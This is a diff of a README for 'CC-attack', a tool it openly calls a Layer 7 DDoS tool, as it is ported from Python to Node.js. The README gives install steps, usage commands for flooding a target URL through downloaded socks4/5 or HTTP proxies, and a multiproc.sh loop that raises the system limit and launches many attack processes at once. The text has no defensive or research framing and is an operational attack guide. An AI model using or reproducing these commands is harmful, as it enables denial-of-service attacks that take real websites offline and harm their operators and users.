@@ -1,26 +1,30 @@
        /////    /////    /////////////
       CCCCC/   CCCCC/   | CC-attack |/
-     CC/      CC/       |-----------|/ 
-     CC/      CC/       |  Layer 7  |/ 
-     CC/////  CC/////   | ddos tool |/ 
+     CC/      CC/       |-----------|/
+     CC/      CC/       |  Layer 7  |/
+     CC/////  CC/////   | ddos tool |/
       CCCCC/   CCCCC/   |___________|/
 
 # CC-attack ![](https://img.shields.io/badge/Version-3.7.1-brightgreen.svg) ![](https://img.shields.io/badge/license-GPLv2-blue.svg)
  A script for using socks4/5 or http proxies to attack http(s) server.
 
+## Translations
+![](https://img.shields.io/badge/Version-Node-brightgreen.svg)
+![](https://img.shields.io/badge/Version-Python-lightblue.svg)
+
  News:
 - [x] Added Support of HTTP proxies
-- [x] Added More proxies api to download 
+- [x] Added More proxies api to download
 
  Info:
-- [x] Using Python3
+- [x] Using nodeJS
 - [x] Added more human-like options
 - [x] Http Get/Head/Post/Slow Flood
 - [x] Random Http Header/Data
 - [x] Socks4/5 Proxies Downloader
 - [x] Socks4/5 Proxies Checker
 - [x] Customize Cookies
-- [x] Customize Post Data 
+- [x] Customize Post Data
 - [x] Support HTTPS
 - [x] Support Socks4/5
 
@@ -30,13 +34,13 @@ Using multiproc.sh with socks4 on a vps
 
 ## Install
 
-    pip3 install requests pysocks
     git clone https://github.com/Leeon123/CC-attack.git
-    cd CC-attack
+    npm i
+    cd CC-attack-js
 
 ## Usage
 
-    python3 cc.py <arguments>
+    node cc.js <arguments>
 
 ```
 ===============  CC-attack help list  ===============
@@ -59,25 +63,26 @@ Using multiproc.sh with socks4 on a vps
 ### Some example of the usage
 Download socks5 proxies as proxy.txt:
 ```
-python3 cc.py -down -f proxy.txt -v 5
+node cc.js -down -f proxy.txt -v 5
 ```
 Attack a target with custom proxies list(socks4.txt) for 30 seconds :
 ```
-python3 cc.py -url http://target.com -f socks4.txt -v 4 -s 30
+node cc.js -url http://target.com -f socks4.txt -v 4 -s 30
 ```
 
 ## Usage of multiproc.sh
 ```
-This script is using for increasing the performance of cc.py.
+This script is using for increasing the performance of cc.js.
 Due to the suck performance of python since it has a GIL lock,
-And I am lazy to make a multiprocess version.
-There is a option for linux user to increase their performance of cc.py
+And the main repo owner was lazy to make a multiprocess version.
+I'm lazy too and wont make it with node, even though Node has multiprocess.
+There is a option for linux user to increase their performance of cc.js
 
-This script basicly just run cc.py multiple times to make it "multi-processing"
+This script basicly just run cc.js multiple times to make it "multi-processing"
 
-First, put this script and cc.py in the same folder.
+First, put this script and cc.js in the same folder.
 
-Then prepare the proxies list by yourself or just run "python3 cc.py -down -v 4" (-v socks version)
+Then prepare the proxies list by yourself or just run "node cc.js -down -v 4" (-v socks version)
 
 After that, change the number of process.
 
@@ -85,9 +90,19 @@ At last, change atk_cmd to your command and run the script by "bash multiproc.sh
 ```
 Example setup of multiproc.sh (-v socks version) (-s attack time)
 ```
-atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"
+# Command to run your Node.js script
+atk_cmd="node cc.js -url http://target.com -v 4 -s 60"
 
-#number of process that you want
+# Number of processes you want
 process=10
 
+# Change the system limit
+ulimit -n 999999
+
+echo Attack started
+for ((i=1; i<=$process; i++))
+do
+  $atk_cmd >/dev/null &
+  sleep 0.1
+done
 ```
